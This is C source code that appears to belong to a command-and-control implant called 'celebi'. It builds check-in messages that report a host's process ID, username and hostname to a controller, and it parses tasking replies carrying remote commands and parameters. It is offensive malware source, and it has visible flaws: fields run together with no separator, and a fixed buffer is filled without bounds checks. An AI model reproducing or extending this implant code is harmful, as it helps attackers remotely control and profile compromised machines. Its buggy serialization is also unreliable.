#include <windows.h>
#include "headers/celebi.h"
#include "headers/HTTP.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);

/*
 *
 * CHECKIN LOGIC
 *
*/

char *generate_checkin_message(CheckinRequest *checkin) {
	// Allocate space and construct the serialized checkin message.
	// For now, we only provide the mandatory fields (no information about the host).
	
	int len = 1024; // TODO dynamically calculate len based on what we're sending
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Payload UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = checkin->payload_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	msg[offset] = MESSAGE_TYPE_CHECKIN;
	offset += 1;
	
	// 4 bytes for the PID.
	for (int i = 0; i < sizeof(checkin->pid); i++) {
		msg[offset] = ((char *) &checkin->pid)[i];
		offset++;
	}
	
	// Optional user field.
	if (checkin->username != 0) {
		int user_len = MSVCRT$strlen(checkin->username);
		for (int i = 0; i < user_len; i++) {
			msg[offset] = checkin->username[i];
			offset++;
		}
	}
	
	// Optional hostname field.
	if (checkin->hostname != 0) {
		int host_len = MSVCRT$strlen(checkin->hostname);
		for (int i = 0; i < host_len; i++) {
			msg[offset] = checkin->hostname[i];
			offset++;
		}
	}
	
	// Add the null byte (if there was no user field, this represents an empty string).
	msg[offset] = 0;
	offset++;
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void parse_checkin_reply(HttpResponse *response, CheckinReply *reply) {
	// Base64 decode the response and unpack the fields into a struct.
	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_decode(response->body, response->body_size, decoded_body);
	
	int offset = 0;
	
	reply->action = decoded_body[offset];
	offset += 1;
	
	reply->callback_uuid = unpack_str(decoded_body, &offset);
	reply->status = unpack_str(decoded_body, &offset);
	
	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
}

void free_checkin_request(CheckinRequest *request) {
	if (request->payload_uuid != NULL) { KERNEL32$VirtualFree(request->payload_uuid, 0, MEM_RELEASE); }
	if (request->username != NULL) { KERNEL32$VirtualFree(request->username, 0, MEM_RELEASE); }
	if (request->hostname != NULL) { KERNEL32$VirtualFree(request->hostname, 0, MEM_RELEASE); }
}

void free_checkin_reply(CheckinReply *reply) {
	if (reply->callback_uuid != NULL) { KERNEL32$VirtualFree(reply->callback_uuid, 0, MEM_RELEASE); }
	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
}

/*
 *
 * TASKING LOGIC
 *
*/

char *generate_tasking_message(TaskingRequest *tasking) {
	// Allocate space and construct the serialized tasking message.
	
	int len = 1024; // TODO dynamically calculate len based on what we're sending
	int offset = 0;
	
	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	
	// Prepend the Callback UUID (36 bytes).
	for (int i = 0; i < 36; i++) {
		msg[offset] = tasking->callback_uuid[i];
		offset++;
	}
	
	// 1 byte for the message type.
	msg[offset] = MESSAGE_TYPE_TASKING;
	offset += 1;
	
	// 1 byte for the tasking size.
	msg[offset] = tasking->tasking_size;
	offset += 1;
	
	// Base64-encode the serialized message.
	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_encode(msg, offset, encoded_msg);
	
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	return encoded_msg;
}

void parse_tasking_reply(HttpResponse *response, TaskingReply *reply) {
	// Base64 decode the response and unpack the fields into a struct.
	char *decoded_body = KERNEL32$VirtualAlloc(0, response->body_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	base64_decode(response->body, response->body_size, decoded_body);
	
	int offset = 0;
	
	reply->action = decoded_body[offset];
	offset += 1;
	
	reply->tasking_size = decoded_body[offset];
	offset += 1;
	
	size_t task_len = reply->tasking_size * sizeof(TaskInfo);
	reply->tasks = KERNEL32$VirtualAlloc(0, task_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0; i < reply->tasking_size; i++) {
		TaskInfo task = { 0 };
		
		task.id = unpack_str(decoded_body, &offset);
		task.command = unpack_str(decoded_body, &offset);
		task.parameters = unpack_str(decoded_body, &offset);
		task.timestamp = unpack_int(decoded_body, &offset);
		
		reply->tasks[i] = task;
	}
	
	KERNEL32$VirtualFree(decoded_body, 0, MEM_RELEASE);
}

void free_tasking_request(TaskingRequest *request) {
	if (request->callback_uuid != NULL) { KERNEL32$VirtualFree(request->callback_uuid, 0, MEM_RELEASE); }
}

void free_tasking_reply(TaskingReply *reply) {
	if (reply->tasks != NULL) {
		for (int i = 0; i < reply->tasking_size; i++) {
			KERNEL32$VirtualFree(reply->tasks[i].id, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(reply->tasks[i].command, 0, MEM_RELEASE);
			KERNEL32$VirtualFree(reply->tasks[i].parameters, 0, MEM_RELEASE);
		}
		KERNEL32$VirtualFree(reply->tasks, 0, MEM_RELEASE);
	}
}
